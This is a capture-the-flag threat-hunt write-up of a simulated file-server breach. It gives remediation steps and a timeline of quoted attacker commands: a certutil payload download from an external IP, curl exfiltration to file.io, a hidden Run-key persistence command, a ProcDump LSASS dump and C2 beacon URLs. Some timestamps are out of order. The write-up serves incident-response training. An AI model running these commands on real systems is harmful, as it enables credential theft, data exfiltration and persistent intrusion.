<img width="584" height="111" alt="image" src="https://github.com/user-attachments/assets/c4f0782c-5c24-4227-94ae-a95e87544970" />

## CTF-Cargo-Hold


## Executive Summary

On 22 November 2025, the file server azuki-fileserver01 was compromised via the fileadmin account (high-privileged admin).

The attacker conducted reconnaissance, downloaded a malicious PowerShell payload from external IP 78.141.196.6.
sensitive data was exfiltrated from multiple file shares (Contracts, Financial, IT-Admin, Shipping).
The Attacker dumped LSASS memory for credentials using ProcDump.

The Attacker established persistence via a registry Run key, and set up ongoing command-and-control (C2) beaconing to the same external IP.
Early exfiltration occurred to file.io.

Subsequent logs (24-25 November) indicate lateral movement to azuki-adminpc (staging additional sensitive user data) and potential access to backup and other systems.

This is a severe breach involving data theft, credential compromise, and persistent access, likely part of a ransomware or espionage operation.

The external C2 IP (78.141.196.6) appears malicious but lacks widespread public reporting as of December 2025.


 ## Recommended Actions (Ordered by Urgency/Severity)

 ## Immediate (Critical - Contain the Breach Now):

- Isolate azuki-fileserver01 and any connected systems (e.g., azuki-adminpc, azuki-backupsrv) from the network to prevent further exfiltration or lateral movement.
- Block outbound traffic to 78.141.196.6 (all ports, especially 8080, 7331, 8880) and known exfiltration sites (e.g., file.io) at the firewall.
- Force password resets and enforce MFA for fileadmin, yuki.tanaka, and all privileged/admin accounts; revoke existing sessions/tokens.
- Disable or delete the persistence mechanism: Remove registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\FileShareSync and delete C:\Windows\System32\svchost.ps1 (and similar artifacts like ex.ps1, pd.exe, lsass.dmp in C:\Windows\Logs\CBS).

## High Priority (Within Hours - Investigate & Eradicate):
- Conduct full forensic analysis on azuki-fileserver01 (preserve images of disks, memory, and logs);
- check for the LSASS dump (C:\Windows\Logs\CBS\lsass.dmp) and extract/analyze any harvested credentials.
- Scan all systems for indicators of compromise (IoCs): Hashes of pd.exe (SHA1: 41354146bfeaa932426ea622aaec7ae9cb402495), beaconing patterns, hidden folders (C:\Windows\Logs\CBS), and unusual PowerShell/cURL activity.
- Assume credentials from LSASS dump are compromised; rotate all domain admin/service account passwords network-wide.

## Medium Priority (Within 1-2 Days - Recover & Report):
- Notify affected parties (e.g., employees, clients) if sensitive data (financial, contracts, credentials) was exfiltrated;
- Assess regulatory reporting requirements (e.g., GDPR, industry-specific).
- Review and revoke any unauthorized access observed in later logs (e.g., RDP from 10.1.0.204/108, Robocopy staging on azuki-adminpc).
- Engage external incident response/forensics team if internal resources are insufficient.

## Ongoing (Longer-Term - Harden & Monitor):

- Implement/strengthen endpoint detection (e.g., restrict PowerShell, block certutil/cURL abuse, monitor LSASS access).
- Conduct a full credential and access audit; reduce privileged account usage on file servers.
- Monitor for further activity from the C2 IP and update threat intelligence feeds.

---

##  Threat Hunt Queries, CTF Flag Response
- [Threat Hunt Queries](https://github.com/StevePerchard/CTF-Cargo-Hold/blob/main/KQL%20Threat%20Hunt%20Scripts.md)
- [CTF Flag Response](https://github.com/StevePerchard/CTF-Cargo-Hold/blob/main/CTF%20Flag%20Response.md)

 ## Chronological Report of Attacker Actions 

### Initial Access & Execution (22 Nov 2025, ~12:40 AM onward)

~12:40:00 AM: Attacker starts a PowerShell session as fileadmin on azuki-fileserver01 (visible as initiating process in many logs, PID 2932).
12:42:24 AM: Runs whoami.exe /all via PowerShell (reconnaissance).
12:42:46 AM: Runs ipconfig /all (network reconnaissance).
12:42:01 AM: Runs net view \\10.1.0.188 (likely checking shares on the local host or another system).
12:55:43 AM: Runs attrib.exe +h +s C:\Windows\Logs\CBS (hides the CBS folder – preparation for staging data).

### Payload Download Attempts

1:02:59 AM: Uses certutil.exe -urlcache -f http://78.141.196.6:8080/ex.ps1 C:\Windows\Logs\CBS\ex.ps1 (attempt to download a PowerShell script – possibly failed or partial).
12:56:47 AM & 12:58:24 AM: Repeats similar certutil commands to port 7331 (multiple attempts to download ex.ps1 – likely the main payload).

### Data Collection & Staging

1:05:21 AM: xcopy.exe C:\FileShares\Contracts C:\Windows\Logs\CBS\contracts /E /I /H /Y (copies Contracts share).
1:06:03 AM: Copies Financial share to C:\Windows\Logs\CBS\financial.
1:07:53 AM: Copies IT-Admin share to C:\Windows\Logs\CBS\it-admin.
1:20:46 AM: Copies Shipping share to C:\Windows\Logs\CBS\shipping.

### Data Archiving & Early Exfiltration

1:59:54 AM – 2:00:20 AM: Uses curl.exe to upload archived data:
credentials.tar.gz
financial.tar.gz
contracts.zip
shipping.tar.gz
All uploaded to https://file.io (early exfiltration of collected data).


### Persistence

2:10:50 AM: Adds registry Run key FileShareSync:
reg.exe add HKLM\...\Run /v FileShareSync /t REG_SZ /d "powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1" /f
(Sets up persistence to run a hidden PowerShell script on boot).


### Credential Dumping

2:03:19 AM: Creates pd.exe (ProcDump from Sysinternals) in C:\Windows\Logs\CBS\pd.exe.
2:24:44 AM: Executes pd.exe -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp (dumps LSASS process memory – classic credential dumping technique, PID 876 likely lsass.exe).

### C2 Beaconing (Implant Activity)

Starting 2:11:16 AM and continuing periodically (2:14, 2:17, 2:29, 2:32, 2:35, 2:39 AM):
curl.exe beacons to http://78.141.196.6:8880/api/beacon with system info:
elevated=high, arch=AMD64, id=7a85dbef, ip=10.1.0.188, os=Microsoft Windows 11 Pro, host=AZUKI-FILESERVE, user=AZUKI-FileServe\fileadmin

Also polls /api/tasks/7a85dbef (classic C2 check-in for tasks/commands).
This strongly indicates a custom implant/beacon (likely from ex.ps1) running with two processes (PIDs 3472 and 7812).


### PowerShell History

2:26:01 AM: PowerShell history file updated (ConsoleHost_history.txt) – attacker likely ran manual commands during the session.

### Later Activity (24–25 Nov 2025) – Lateral Movement & Further Actions

Multiple logons observed on azuki-fileserver01 as fileadmin and yuki.tanaka around 24 Nov afternoon (possible further access or share browsing).
25 Nov 2025:
Activity on azuki-adminpc as yuki.tanaka using Robocopy to stage sensitive folders (Contracts, Tax-Records, Banking, QuickBooks) to C:\ProgramData\Microsoft\Crypto\staging\ (possible ransomware prep or further exfiltration).
RDP connections observed (mstsc.exe to 10.1.0.108).
Logons on azuki-backupsrv and azuki-sl.




## Mitre Att@ck TTP's Encountered
<img width="754" height="606" alt="image" src="https://github.com/user-attachments/assets/e9f2e26e-9691-48de-95ff-a3aa6ac96cb5" />
